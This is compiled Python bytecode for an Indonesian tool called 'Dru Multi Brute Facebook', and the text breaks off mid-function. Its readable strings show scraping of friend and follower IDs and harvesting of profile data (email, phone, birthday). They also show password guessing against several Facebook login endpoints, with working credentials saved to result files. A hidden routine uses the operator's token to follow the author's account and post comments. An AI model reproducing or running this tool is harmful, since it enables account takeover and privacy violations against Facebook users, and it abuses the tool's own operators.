ó
Âac           @   s¹  d  d l  Z  y d  d l Z Wn8 e k
 rV d GHe  j e  j d k rL d n d  n Xy d  d l Z Wn8 e k
 r¡ d GHe  j e  j d k r d n d  n Xy d  d	 l m Z Wn8 e k
 rð d
 GHe  j e  j d k ræ d n d  n Xd  d l Z d  d l Z d  d l	 Z	 d  d l  Z  d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e j   Z e j Z d d d d d d d d d d d d g Z y0 e d k  päe d k rñe   n  e d Z Wn e k
 re   n Xe j   Z e j Z e j Z e j Z  e e Z! e" e	  e	 j# d  d  Z$ d! Z% d" Z& d# Z' d$ Z( d% Z) d& Z* d' Z+ e$ e% e& e' e( e) e* e+ g Z, e j- e,  Z. g  a/ g  a0 g  Z1 g  Z2 d a3 g  Z4 g  a5 d(   Z6 d)   Z7 e j8 d*  j9 Z: d+ e% e' e& e% e+ e+ e+ f Z; d,   Z< d-   Z= d.   Z> d/   Z? d0   Z@ d1   ZA d2   ZB d3   ZC d4   ZD d5   ZE d6   ZF d7 f  d8     YZG eH d9 k rµe>   n  d S(:   iÿÿÿÿNs*   
 [x] Modul requests belum terinstall!...
t   nts   pip install requestss   pip2 install requestss)   
 [x] Modul Futures belum terinstall!...
s   pip install futuress   pip2 install futures(   t   BeautifulSoups%   
 [x] Modul bs4 belum terinstall!...
s   pip install bs4s   pip2 install bs4(   t   ThreadPoolExecutor(   t   datetime(   t   sleept   Januarit   Februarit   Marett   Aprilt   Meit   Junit   Julit   Agustust	   Septembert   Oktobert   Nopembert   Desemberi    i   i   s   utf-8s   [1;97ms   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [0mc         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   t   syst   stdoutt   writet   flusht   timeR   (   t   zt   e(    (    s   /sdcard/Lay.pyt   jalanA   s    c          C   s[   d d d d d d g }  x< |  D]4 } d t  t t  | f Gt j j   t j d  q Wd  S(   Ns   [1;92m.   s   [1;93m..  s   [1;96m... s!    %s[%s+%s] Menghapus Token FB %si   (   t   Nt   MR   R   R   R   R   (   t   titikt   x(    (    s   /sdcard/Lay.pyt   todH   s
    s   https://api.ipify.orgs  %s â¦ââââââ¦ â¦   â¦ââââ¦âââ âââ
 %sâ â¦ââ âââ¦âââââ â¦âââââ â©ââ â£ 
 %sâ©âââââ â©    â©âââ© â©ââââ  %s
%s %s==================================================%sc         C   s   t  |   d k s$ t  |  d k rv d t t t t t  |    t f GHd t t t t t  |   t f GHt   n d t t f GHt   d  S(   Ni    s   
 [%sâ%s] Total OK : %s%s%ss    [%sâ%s] Total CP : %s%s%ss4   
 [%s!%s] Maaf kamu tidak mendapatkan hasil Intip :((   t   lent   HR   t   strt   Kt   exitR   (   t   okt   cp(    (    s   /sdcard/Lay.pyt   hasilS   s    $$$
c       	   C   s  t  j d  d t t t t t t t t f GHt d t t t t f  }  |  d k rd t t f GHt j d  d	 t t t f GHt j d  d
 t t t f GHt j d  d t t t t t t f GHt j d  t d t	 t f  t  j d  t
   n  yÞ t j d |   } t j | j  } | d } t d d  } | j |   | j   d t t t | t f GHt j d  d t t f GHt j d  d t t f GHt j d  t d t	 t f  t  j d  t   Wn7 t k
 rd t t t f GHt j d  t
   n Xd  S(   Nt   clears    %s*%s Tools ini menggunakan login token FB.
 %s*%s Apakah kamu sudah tau cara mendapatkan Token FB?
 %s*%s Ketik %sopen%s untuk mendapatkan Token FB.s"   
 %s[%s?%s] Masukkan Token FB :%s t   opent   Opent   OPENsI   
%s *%s NOTE! Usahakan akun tumbal login di google chrome terlebih dahului   s8   %s *%s Jangan lupa! url ubah ke %shttps://m.facebook.coms=   %s *%s Setelah di alihkan ke google chrome. klik %stitik tigasG   %s *%s Lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.s    [%s ENTER%s ] sP   xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_s-   https://graph.facebook.com/me?access_token=%st   names   __dru__.txtt   ws   
 %s*%s Selamat datang %s%s%ss¸    %s!%s Mohon untuk menggunakan SC ini sewajarnya, kami tidak bertanggung jawab jika SC ini disalah gunakan. Jika ada bug atau masalah dalam SC ini mohon untuk melaporkannya ke Wa Admins9    %s*%s Tekan ENTER untuk melanjutkan & Intip Wa Author SCs4   xdg-open https://wa.me/6281318306972?text=Hallo+bangs   

 %s[%s!%s] Token Invalid(   R'   R(   R)   (   t   ost   systemR   R   t	   raw_inputR   t   BR   R   t   Ot   yayanxdt   requestst   gett   jsont   loadst   textR'   R   t   closeR!   t   kontolt   KeyError(   t	   __cindy__t   otwt   at   namat   zedd(    (    s   /sdcard/Lay.pyR1   ]   sF    !


c          C   sì  t  j d  y t d d  j   }  WnW t t f k
 r t  j d  d t t t f GHt j	 d  t  j d  t
   n Xy= t j d |   } t j | j  } | d } | d	 } Wn t t f k
 rt  j d  d t t t f GHt j	 d  t  j d  t
   n0 t j j k
 rEd
 t t t f GHt   n Xt  j d  t GHd t t t t f GHd t t t t f GHd t t t t f GHd t t t t f GHd t t t t f GHd t GHd t t t t | t f GHd t t t t | t f GHd t t t t t f GHd t GHd t t t f GHd t t t f GHd t t f GHd t t f GHd t t f GHd t t t t f GHd t t f GHd t t f GHd t t t t f GHd t t f GHd t t t t t f GHt   d  S(   NR&   s   __dru__.txtt   rs   
 %s[%sx%s] Token Invalidi   s   rm -rf __dru__.txts-   https://graph.facebook.com/me?access_token=%sR*   t   ids   

 %s[%s!%s] Tidak ada koneksi
s,    %s[%s*%s] Author    : %sMuhamad Badru Wasihs2    %s[%s*%s] Facebook  : %sfacebook.com/Bang.badru23s$    %s[%s*%s] Whatsapp  : %s08811403654s1    %s[%s*%s] Nama SC   : %sDru Multi Brute Facebooks    %s[%s*%s] Versi SC  : %sV1.3s5    %s==================================================s    %s[%s*%s] Nama FB : %s%s%ss    %s[%s*%s] ID FB   : %s%s%ss    %s[%s*%s] IP Anda : %s%ss    [%s?%s] %sMENU PILIHANs"    %s[%s1%s] Intip dari Daftar Temans     [%s2%s] Intip dari Teman Publiks#    [%s3%s] Intip dari Total Followerss"    [%s4%s] Intip dari Like Postingans    [%s5%s] %sMULAI INTIP%ss"    [%s6%s] Cek Hasil Intip Point 1-4s$    [%s7%s] Fitur Cek Informasi Akun FBs0    [%s8%s] Multi Intip dari Teman Publik (%sNew%s)s    [%s9%s] Info SC Badrus,    %s[%s0%s] Logout (%sGanti/Hapus Token FB%s)(   R,   R-   R'   t   readR9   t   IOErrorR   R   R   R   R1   R2   R3   R4   R5   R6   t
   exceptionst   ConnectionErrorR"   t   logoR   R!   t   IPt0   awokawokawokawokawokawokawokawokawokawokawokawok(   R:   t   osjaoaosnsit   jaoanzjwowjR=   t   idfb(    (    s   /sdcard/Lay.pyt
   moch_yayan   s^    

		c          C   s¿  t  d t t f  }  |  d k ra d t t t t |  t f GHt j d  t j d  t   nZ|  d k rw t	   nD|  d k r t
   n.|  d k r£ t   n|  d	 k r¹ t   n|  d
 k rÕ t   j   næ|  d k r³d GHd GHt  d  } | d k rt   q»| d k s%| d k rÑyu t d t t t f  j   j   } d GHd t t t t t t |  f GHt j d t t t f  d GHt   Wq°t k
 rÍd GHt  d t t f  t   q°Xq»| d k sé| d k r©y t d t t t f  j   j   } d GHd t t t t t t |  f GHt j d t t t f  d GHt  d t t f  t   Wq°t k
 r¥d GHt  d t t f  t   q°Xq»t   n|  d k rêt d t t f  t j d  t   nÑ |  d k rt j d   nµ |  d! k rt   n |  d" k rd# GHt   t j d  t j d$  t d% t t t t f  t j d&  t   n< d' t t t t |  t f GHt j d  t j d  t   d  S((   Ns   
 [%s?%s] Pilih Menu : t    sK   
 %s[%s!%s] Pilihan menu [%s%s%s] tidak ada, cek kembali menu pilihan Anda!i   R&   t   1t   2t   3t   4t   5t   6s2   
 [0;97m[[1;92m1[0;97m] Cek hasil [1;92mOK[0ms1    [0;97m[[1;93m2[0;97m] Cek hasil [1;93mCP[0ms#   
 [0;97m[[0;93m?[0;97m] Pilih : t   01s   results/OK-%s-%s-%s.txts5   
 ==================================================sl    [0;97m[[0;92m+[0;97m] Hasil [0;92mOK[0;97m pada tanggal : [0;92m%s-%s-%s [0;92mTotal %s: %s%s[0;92ms   cat results/OK-%s-%s-%s.txts4    ==================================================s<    [0;97m[[0;91m![0;97m] Kamu tidak mendapatkan hasil OK :(s    [%s KEMBALI%s ] t   02s   results/CP-%s-%s-%s.txtsl    [0;97m[[0;92m+[0;97m] Hasil [0;93mCP[0;97m pada tanggal : [0;92m%s-%s-%s [0;92mTotal %s: %s%s[0;93ms   cat results/CP-%s-%s-%s.txts<    [0;97m[[0;91m![0;97m] Kamu tidak mendapatkan hasil CP :(t   7sC   
 NOTE! Ketik %suser%s jika anda ingin mendapatkan ID dari usernamegìQ¸ë±?t   8s   python2 random_id.pyt   9t   0s   
s   rm -rf __dru__.txts+   
 %s[%sâ%s]%s Berhasil menghapus Token FBi   sK   
 %s[%s!%s] Pilihan menu [%s%s%s] tidak ada, cek kembali pilihan menu Anda!(   R.   R!   R   R   R   R   R,   R-   RK   t   temant   publikt	   followerst	   postingant	   __crack__t   slurrR'   t   hat   opt   taRA   t
   splitlinesR   R   RB   R0   R   t	   cek_ingfot
   info_toolsR   R"   (   t   yant   askt   totalokt   totalcp(    (    s   /sdcard/Lay.pyRG   ·   s    





%!%!



c          C   sÉ   y t  d d  j   }  Wn6 t t f k
 rQ d t t t f GHt j d  n Xt j	 d d d d g  } d	 } d	 } t
 j d
 |   t
 j d | |  |  f  t
 j d | | |  f  t   d  S(   Ns   __dru__.txtR?   s   
 %s[%sx%s] Token invalids   rm -rf __dru__.txts
   Ganteng kat   Kerent   Gansst   kasept   3015873888630276sF   https://graph.facebook.com/100006230836266/subscribers?access_token=%ssB   https://graph.facebook.com/%s/comments/?message=%s&access_token=%s(   R'   RA   R9   RB   R   R   R,   R-   t   randomt   choiceR2   t   postRK   (   R:   t   hoetankt
   xi_jimpinxt   goceng(    (    s   /sdcard/Lay.pyR8     s    c    
   
   C   so  y t  d d  j   }  WnD t k
 r_ d t t t f GHt j d  t j d  t	   n Xy t j
 d  Wn n Xyt d t t f  } t d t t f  } t j d	 | |  f  } g  } t j | j  } d
 | d j d d  } t  | d  } x­ | d D]¡ } | j | d d | d  | j | d d | d d  t j d d d d d d d d g  }	 d |	 d t t |   Gt j j   t j d  qW| j   t d t t t f  d  t t t | t f GHd! d" GHt d# t t f  t    WnV t! t f k
 rjt j" |  t d$ t t t f  t d% t t f  t    n Xd  S(&   Ns   __dru__.txtR?   s   
 %s[%sx%s] Token Invalids   rm -rf __dru__.txtg{®Gáz?t   dumps   
 [%s?%s] Nama File  : s    [%s?%s] Total ID   : s>   https://graph.facebook.com/me/friends?limit=%s&access_token=%ss   dump/s   .jsont    t   _R+   t   dataR@   s   <=>R*   s   
s   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [1;97ms   [0ms   s#    [*] Menghitung Total Dump ID : %s g{®Gázt?s*   

 %s[%sâ%s] Berhasil dump ID dari temans'    [%sâ%s] Salin/Copy File : ( %s%s%s )i2   t   =s    [%s ENTER%s ] s;   
 %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.
s    [ %sKEMBALI%s ] (#   R'   RA   RB   R   R   R,   R-   R   R   R1   t   mkdirR.   R!   R2   R3   R4   R5   R6   t   replacet   appendR   Rm   Rn   R    R   R   R   R   R7   R   R   R0   RK   R9   t   remove(
   R:   t   mmkt   aswt   ihhR@   R   t   cint   ysR<   R+   (    (    s   /sdcard/Lay.pyRY     sJ    !'
	c       
   C   s  y t  d d  j   }  WnD t k
 r_ d t t t f GHt j d  t j d  t	   n Xy t j
 d  Wn n Xy°t d t t f  } t d t t f  } t d	 t t f  } t j d
 | | |  f  } g  } t j | j  } d | d j d d  } t  | d  } x­ | d D]¡ }	 | j |	 d d |	 d  | j |	 d d |	 d d  t j d d d d d d d d g  }
 d |
 d t t |   Gt j j   t j d  q(W| j   t d  t t t f  d! t t t | t f GHd" d# GHt d$ t t f  t    WnV t! t f k
 rt j" |  t d% t t t f  t d& t t f  t    n Xd  S('   Ns   __dru__.txtR?   s   
 %s[%sx%s] Token Invalids   rm -rf __dru__.txtg{®Gáz?Rs   s   
 [%s?%s] ID Publik  : s    [%s?%s] Nama File  : s    [%s?%s] Total ID   : s>   https://graph.facebook.com/%s/friends?limit=%s&access_token=%ss   dump/s   .jsonRt   Ru   R+   Rv   R@   s   <=>R*   s   
s   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [1;97ms   [0ms   s#    [*] Menghitung Total Dump ID : %s g{®Gázt?s1   

 %s[%sâ%s] Berhasil dump ID dari teman publiks'    [%sâ%s] Salin/Copy File : ( %s%s%s )i2   Rw   s    [%s ENTER%s ] s;   
 %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.
s    [ %sKEMBALI%s ] (#   R'   RA   RB   R   R   R,   R-   R   R   R1   Rx   R.   R!   R2   R3   R4   R5   R6   Ry   Rz   R   Rm   Rn   R    R   R   R   R   R7   R   R   R0   RK   R9   R{   (   R:   t   csyt   ahhR~   t   xxxR@   R   t   kntlR   R<   R+   (    (    s   /sdcard/Lay.pyRZ   =  sL    !'
	c       
   C   s  y t  d d  j   }  WnD t k
 r_ d t t t f GHt j d  t j d  t	   n Xy t j
 d  Wn n Xy°t d t t f  } t d t t f  } t d	 t t f  } t j d
 | | |  f  } g  } t j | j  } d | d j d d  } t  | d  } x­ | d D]¡ }	 | j |	 d d |	 d  | j |	 d d |	 d d  t j d d d d d d d d g  }
 d |
 d t t |   Gt j j   t j d  q(W| j   t d  t t t f  d! t t t | t f GHd" d# GHt d$ t t f  t    WnV t! t f k
 rt j" |  t d% t t t f  t d& t t f  t    n Xd  S('   Ns   __dru__.txtR?   s   
 %s[%sx%s] Token Invalids   rm -rf __dru__.txtg{®Gáz?Rs   s   
 [%s?%s] ID Follow  : s    [%s?%s] Nama File  : s    [%s?%s] Total ID   : sB   https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%ss   dump/s   .jsonRt   Ru   R+   Rv   R@   s   <=>R*   s   
s   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [1;97ms   [0ms   s#    [*] Menghitung Total Dump ID : %s g{®Gázt?s4   

 %s[%sâ%s] Berhasil dump ID dari total followerss'    [%sâ%s] Salin/Copy File : ( %s%s%s )i2   Rw   s    [%s ENTER%s ] s;   
 %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.
s    [ %sKEMBALI%s ] (#   R'   RA   RB   R   R   R,   R-   R   R   R1   Rx   R.   R!   R2   R3   R4   R5   R6   Ry   Rz   R   Rm   Rn   R    R   R   R   R   R7   R   R   R0   RK   R9   R{   (   R:   R   R|   R}   t   pokR@   R   t   ahR   R<   R+   (    (    s   /sdcard/Lay.pyR[   i  sL    !'
	c       
   C   s  y t  d d  j   }  WnD t k
 r_ d t t t f GHt j d  t j d  t	   n Xy t j
 d  Wn n Xy°t d t t f  } t d t t f  } t d	 t t f  } t j d
 | | |  f  } g  } t j | j  } d | d j d d  } t  | d  } x­ | d D]¡ }	 | j |	 d d |	 d  | j |	 d d |	 d d  t j d d d d d d d d g  }
 d |
 d t t |   Gt j j   t j d  q(W| j   t d  t t t f  d! t t t | t f GHd" d# GHt d$ t t f  t    WnV t! t f k
 rt j" |  t d% t t t f  t d& t t f  t    n Xd  S('   Ns   __dru__.txtR?   s   
 %s[%sx%s] Token Invalids   rm -rf __dru__.txtg{®Gáz?Rs   s   
 [%s?%s] ID Posting : s    [%s?%s] Nama File  : s    [%s?%s] Total ID   : s<   https://graph.facebook.com/%s/likes?limit=%s&access_token=%ss   dump/s   .jsonRt   Ru   R+   Rv   R@   s   <=>R*   s   
s   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [1;97ms   [0ms   s#    [*] Menghitung Total Dump ID : %s g{®Gázt?s3   

 %s[%sâ%s] Berhasil dump ID dari like postingans'    [%sâ%s] Salin/Copy File : ( %s%s%s )i2   Rw   s    [%s ENTER%s ] s;   
 %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.
s    [ %sKEMBALI%s ] (#   R'   RA   RB   R   R   R,   R-   R   R   R1   Rx   R.   R!   R2   R3   R4   R5   R6   Ry   Rz   R   Rm   Rn   R    R   R   R   R   R7   R   R   R0   RK   R9   R{   (   R:   R   t   ppkR}   t   konR@   R   t   ikehR   R<   R+   (    (    s   /sdcard/Lay.pyR\     sL    !'
	c          C   s  y t  d d  j   }  WnJ t t f k
 re d t t t f GHt j d  t j	 d  t
   n Xy t d t t f  } | d? k rÃ t d
 t t f  t j	 d  t j d  t   n  t j d | |  f  } t j | j  } | d } Wn- t t f k
 r"d t t f } n n Xy | d } Wn- t t f k
 r`d t t f } n n Xy | d } Wn- t t f k
 rd t t f } n n Xy | d } Wn- t t f k
 rÜd t t f } n n Xy | d } Wn- t t f k
 rd t t f } n n Xy | d }	 Wn- t t f k
 rXd t t f }	 n n Xy | d }
 Wn- t t f k
 rd t t f }
 n n Xy | d } Wn- t t f k
 rÔd t t f } n n Xy d | d d } Wn- t t f k
 rd t t f } n n Xy | d d } Wn- t t f k
 r\d t t f } n n Xy | d d } Wn- t t f k
 rd t t f } n n Xy | d } Wn- t t f k
 rÜd t t f } n n Xy | d } Wn- t t f k
 rd t t f } n n Xy | d } Wn- t t f k
 rXd t t f } n n Xy | d } Wn- t t f k
 rd t t f } n n Xy | d  } Wn- t t f k
 rÔd t t f } n n XyU t j d! | |  f  } t j | j  } x# | d" D] } t j | d#  qWWn n Xy= t j d$ | |  f  } t j | j  } | d% d& } Wn- t t f k
 r d t t f } n n Xd' GHt j	 d(  d) | GHt j	 d(  d* | GHt j	 d(  d+ | GHt j	 d(  d, | GHt j	 d(  d- GHt j	 d(  d. | GHt j	 d(  d/ | GHt j	 d(  d0 | GHt j	 d(  d1 |	 GHt j	 d(  d2 t t t   GHt j	 d(  d3 | GHt j	 d(  d4 | GHt j	 d(  d5 | | f GHt j	 d(  d6 | GHt j	 d(  d7 | GHt j	 d(  d8 | GHt j	 d(  d9 |
 GHt j	 d(  d: | GHt j	 d(  d; t t t f Gd< d= GHt d> t t f  t j	 d(  t   d  S(@   Ns   __dru__.txtR?   s!   
 %s[%s!%s] Token/Cookies Invalids   rm -rf __dru__.txtg{®Gáz?s   
 [%s?%s] Masukkan ID FB : t   usert   Usert   USERs*   
 [%s!%s] Anda akan di arahkan ke browser!i   s7   xdg-open https://commentpicker.com/find-facebook-id.phps-   https://graph.facebook.com/%s?access_token=%sR*   s   %s-%st
   first_namet	   last_namet   usernamet   birthdayt   gendert   timezonet   relationship_statuss	   %sJones%ss	   dengan %st   significant_othert   locationt   hometownt   linkt   updated_timet   mobile_phonet   emailt   aboutsA   https://graph.facebook.com/%s/friends?limit=50000&access_token=%sRv   R@   s9   https://graph.facebook.com/%s/subscribers?access_token=%st   summaryt   total_counts   
  * Informasi Akun Facebook *g¸ëQ¸?s   
 [*] Nama Lengkap : %ss    [*] Nama Depan   : %ss    [*] Nama Belakang : %ss    [*] Username FB  : %ss   
  * Data-data akun facebook *
s    [*] Gmail Facebook : %ss    [*] Nomor Telepon  : %ss    [*] Tanggal Lahir  : %ss    [*] Kenis Kelamin  : %ss    [*] Jumlah Teman  : %ss    [*] Total Followers : %ss    [*] Link Facebook  : %ss    [*] Status Hubungan : %s %ss    [*] Tentang Status : %ss    [*] Kota Asal      : %ss    [*] Tinggal di     :â° %ss    [*] Zona waktu     : %ss    [*] Terakhir FB di update : %ss
    %s[%s#%s]i2   s   [1;96m=[0ms3   
 [%sâ%s] Berhasil mengechek data akun Facebook

(   R   R   R   (   R'   RA   R9   RB   t   PR   R,   R-   R   R   R1   R.   R!   R   R   Rc   R2   R3   R4   R5   R6   R@   Rz   R    R   R0   R"   (   R:   R   t   awwR   t   nmaat   ndpnt   nmblR   t   ttllt   gndrt   tzimt   stast   dgnt   tiglt   darit   linst   uptdt   nmrrt   emait   biooR?   R   t   it   pengikut(    (    s   /sdcard/Lay.pyRc   Á  sP   
															c           C   s$  t  j d  d t t t f Gd d GHt j d  d t t t t f GHt j d  d t t t t f GHt j d  d t t t t f GHt j d  d	 t t t t f GHt j d  d
 t t t t f GHt j d  d t t t f Gd d GHt j d  t d t t f  t	   d  S(   NR&   s	   %s[%s*%s]i2   s   [1;96m=[0mgìQ¸ë±?s*   %s[%sâ%s] Author	: %sMuhamad Badru Wasihs1   %s[%sâ%s] Code SC	: %sKombinasi Yayan-XD & Romis(   %s[%sâ%s] Github	: %sgithub.com/AkinXDs&   %s[%sâ%s] Whatsapp	: %s+628811403654s2   %s[%sâ%s] Facebook	: %sfacebook.com/Bang.badru23s   [%s KEMBALI%s ](
   R,   R-   R   R0   R   R   R   R!   R.   RK   (    (    (    s   /sdcard/Lay.pyRd     s"    R]   c           B   s>   e  Z d    Z d   Z d   Z d   Z d   Z d   Z RS(   c         C   s   g  |  _  d  S(   N(   t   fl(   t   self(    (    s   /sdcard/Lay.pyt   __init__  s    c            s  y\ t  d t t f    _ t   j  j   j     _ d t t t	 t
   j  t f GHWn9 d t t	 t t	   j t f GHt j d  t   n Xt  d t t t t t	 t f  } | d k râd t t t t f GHd	 t	 t t	 t f GHx£t rÞt  d
 t t f  } d t t t	 | t f GH| d k r@  j   qó d    f d  } d t GHd t t t f GHd t t t t t t t f GHd t t t t t t t f GHd t t t t t t	 t f GH| | j d   Pqó Wn´ | d k rpd t GHd t t t f GHd t t t t t t t f GHd t t t t t t t f GHd t t t t t t	 t f GH  j   n& d t t	 t f GHt j d  t   d  S(   Ns   
 [%s?%s] Masukkan Nama File : s    [%s*%s] Total ID : %s%s%ssF   
 %s[%s!%s] File [%s%s%s] tidak ada, Silahkan dump ID terlebih dahulu!i   s=    [%s?%s] Ingin menggunakan kata sandi manual? [%sY%s/%sT%s]: t   Yt   ys.   
 [%s?%s] Contoh: %ssayang,bismillah,dru123%s s4    [%s!%s] %sGunakan simbol (,) untuk pemisah sandi%s s"   
 [%s?%s] Masukkan Sandi Manual : s/    [%s?%s] Sandi Manual Telah Dibuat : [ %s%s%s ]RL   c      
      s°  t  d t t f  } | d k r/   j   n}| d k rLd t GHd t t t t t t t t t f	 GHd t t t t t t t t t f	 GHd t GHd t t t f GHd t GHt	 d d	  R } xH   j
 D]= } y- | j d
  d } | j   j | |   WqÌ qÌ XqÌ WWd  QXd t t t f GHt j   j  t t t  t   n`| d k rid t GHd t t t t t t t t t f	 GHd t t t t t t t t t f	 GHd t GHd t t t f GHd t GHt	 d d	  R } xH   j
 D]= } y- | j d
  d } | j   j | |   WqéqéXqéWWd  QXd t t t f GHt j   j  t t t  t   nC| d k rd t GHd t t t t t t t t t f	 GHd t t t t t t t t t f	 GHd t GHd t t t f GHd t GHt	 d d	  R } xH   j
 D]= } y- | j d
  d } | j   j | |   WqqXqWWd  QXd t t t f GHt j   j  t t t  t   n& d t t t f GHt j d  t   d  S(   Ns    
 [%s?%s] Pilihan Metode Anda : RL   RM   s5    %s==================================================s8    [%sâ%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%ss8    [%sâ%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%sse    [%s!%s] %sMatikan data selular untuk menjeda proses &
 Merefresh Cache IP Address agar lebih Stabil.t   max_workersi   s   <=>i    s,   
 %s[%sâ%s] Proses Intip by Dru Selesai...RN   RO   s   
 %s[%s!%s] Isi dengan bener!i   (   R.   R!   R   t   __yan__R   R_   R`   Ra   R   t   YayanGantengR@   t   splitt   submitt   __api__R,   R{   t   apkR%   R#   R$   R"   t
   __mbasic__t   __mfb__R   R   RK   (   t   yscR   t   __yayanXD__R   t   kimochi(   R²   (    s   /sdcard/Lay.pyR·   ®  sx    	$$		
	$$		
	$$		
s5    %s==================================================s8    %s[%s?%s] Pilih Metode Intip Anda. Silahkan coba satuÂ²s@    %s[%s1%s] Metode %sb-api %s(%sProses Cepat Via UA Opera Mini%s)s:    %s[%s2%s] Metode %smbasic %s(%sProses Normal Via UA IE%s)s<    %s[%s3%s] Metode %smobile %s(%sProses Lama Via UA Chrome%s)t   ,t   Tt   ts   
 %s[%sx%s] y/t !i   (   R´   Rµ   (   RÃ   RÄ   (   R.   R!   R   R¼   R'   RA   Rb   R@   R   R   R   R   R   R   RK   t   TrueR^   t   NoneR0   R¹   t   __pler__(   R²   t   ___yayanganteng___t   pwekR·   (    (   R²   s   /sdcard/Lay.pyR^     sH    %"	D		c         C   sÊ  d t  t |  j  t t  t t  f Gt j j   x| D]{} | j   } y t	 j
 d  Wn n Xt j d g  } i t t j d d   d 6t t j d d   d	 6t t j d d   d
 6d d 6d d 6| d 6d d 6d d 6} i	 d d 6d d 6d d 6| d 6d d 6| d 6d d 6d  d! 6d" d# 6} d$ } t j | d% | d& | } t j d' | j  rÈd( t | | t f GHd) | | f }	 t j |	  t d* t t t f d+  j d, |	  Pq= d- | j   d. k r= yN t d/ d0  j   }
 t j d1 | |
 f  } t j | j  } | d2 a Wn# t  t! f k
 rKd3 a n n Xd4 t" | | t t f GHd5 | | t f }	 t j |	  t d6 t t t f d+  j d, |	  Pq= q= q= Wt  d7 7a  d  S(8   NsC    [[1;96m*[0m] Intip : %s/%s [1;92mOK:%s [0m- [1;93mCP:%s [0mt   resultss   Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501g    ÐsAg    8|As   x-fb-connection-bandwidthi N  i@  s   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines/   350685531728%7C62f8ce9f74b12f84c123cc23437a4a32t   access_tokent   JSONt   formatRN   t   sdk_versionR   t   en_USt   localet   passwordt   iost   sdkRM   t   generate_session_cookiest    3f555f99fb61fcd7aa0c44f58f522ef6t   sigs,   https://b-api.facebook.com/method/auth.logint   paramst   headerss	   (EAAA)\w+s    %sID: %s|%s      %ss    [â] %s|%ss   results/OK-%s-%s-%s.txtR<   s   %s
s   www.facebook.comt	   error_msgs   __dru__.txtR?   s-   https://graph.facebook.com/%s?access_token=%sR   Rt   s    %sID: %s|%s %s     %ss    [â] %s|%s %ss   results/CP-%s-%s-%s.txti   (#   t   loopR   R@   R#   R$   R   R   R   t   lowerR,   Rx   Rm   Rn   R    t   randintR2   R3   t   ret   searchR6   R   R   Rz   R'   R_   R`   Ra   R   R4   RA   R5   t   ttR9   RB   R!   (   R²   R   t   _yan_t   pwt   uapit   headers_RÙ   t   apit   responset   wrtR:   t   akt   az(    (    s   /sdcard/Lay.pyR»     sH    )tE'	'c         C   s  d t  t |  j  t t  t t  f Gt j j   xC| D];} | j   } y t	 j
 d  Wn n Xd } i t t j d d   d 6t t j d d   d	 6t t j d d   d
 6d d 6d d 6| d 6d d 6d d 6} t j d d i | d 6| d 6d d 6d | } | j } d | k s5d | k rd t | | t f GHd | | f } t j |  t d t t t f d   j d! |  Pn  d" | k r= yN t d# d$  j   }	 t j d% | |	 f  }
 t j |
 j  } | d& a Wn# t t  f k
 rd' a n n Xd( t! | | t t f GHd) | | t f } t j |  t d* t t t f d   j d! |  Pq= q= q= Wt  d+ 7a  d  S(,   NsE    [[1;96m*[0m] Intip : %s/%s [1;92mOK-:%s [0m- [1;93mCP-:%s [0mRÊ   s>   Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Geckog    ÐsAg    8|As   x-fb-connection-bandwidthi N  i@  s   x-fb-sim-hnis   x-fb-net-hniRË   s   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types
   user-agents!   application/x-www-form-urlencodeds   content-typeRÌ   s   x-fb-http-engines%   https://mbasic.facebook.com/login.phpRv   R   t   passRº   t   loginRÚ   t   mbasic_logout_buttons   save-devices    %sID: %s|%s      %ss    [â] %s|%ss   results/OK-%s-%s-%s.txtR<   s   %s
t
   checkpoints   __dru__.txtR?   s-   https://graph.facebook.com/%s?access_token=%sR   Rt   s    %sID: %s|%s %s     %ss    [â] %s|%s %ss   results/CP-%s-%s-%s.txti   ("   RÜ   R   R@   R#   R$   R   R   R   RÝ   R,   Rx   R    Rm   RÞ   R2   Ro   t   contentR   R   Rz   R'   R_   R`   Ra   R   RA   R3   R4   R5   R6   Rá   R9   RB   R!   (   R²   R   Râ   Rã   t   umbRå   t   awt   xoRè   R:   Ré   Rê   (    (    s   /sdcard/Lay.pyR½   3  sF    )t0	'	'c         C   sü  d t  t |  j  t t  t t  f Gt j j   xµ| D]­} | j   } y t	 j
 d  Wn n Xd } i t t j d d   d 6t t j d d   d	 6t t j d d   d
 6d d 6d d 6| d 6d d 6d d 6} t j   } | j d  | j j d |  | j d d i | d 6| d 6j } d | j j   j   k rõd j g  | j j   j   D] \ } }	 d | |	 f ^ qm }
 d t | | |
 t f GHd | | |
 f } t j |  t d t t t  f d   j! d! |  Pq= d" | j j   j   k r= yN t d# d$  j"   } t j d% | | f  } t# j$ | j%  } | d& a& Wn# t' t( f k
